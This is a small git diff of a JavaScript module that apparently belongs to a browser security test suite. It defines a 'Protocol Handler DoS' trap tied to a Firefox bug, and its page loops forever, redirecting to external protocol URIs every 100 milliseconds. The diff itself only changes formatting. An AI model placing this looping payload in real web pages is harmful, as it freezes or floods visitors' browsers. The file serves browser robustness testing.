@@ -1,7 +1,6 @@
 /* eslint-disable no-constant-condition */
 const EvilTrap = require('../../EvilTrap');
 
-
 module.exports = new EvilTrap('Protocol Handler DoS', EvilTrap.CATEGORY.DOS,
   'Repeated calls to external protocols URIs triggering prompts or external applications.', { firefox: '1573736' })
   .addScriptPage(() => {
@@ -12,7 +11,7 @@ module.exports = new EvilTrap('Protocol Handler DoS', EvilTrap.CATEGORY.DOS,
         while (true) {
           window.location.href = proto;
           // eslint-disable-next-line no-await-in-loop
-          await new Promise(resolve => setTimeout(resolve, 100));
+          await new Promise((resolve) => setTimeout(resolve, 100));
         }
       });
       document.body.appendChild(btn);
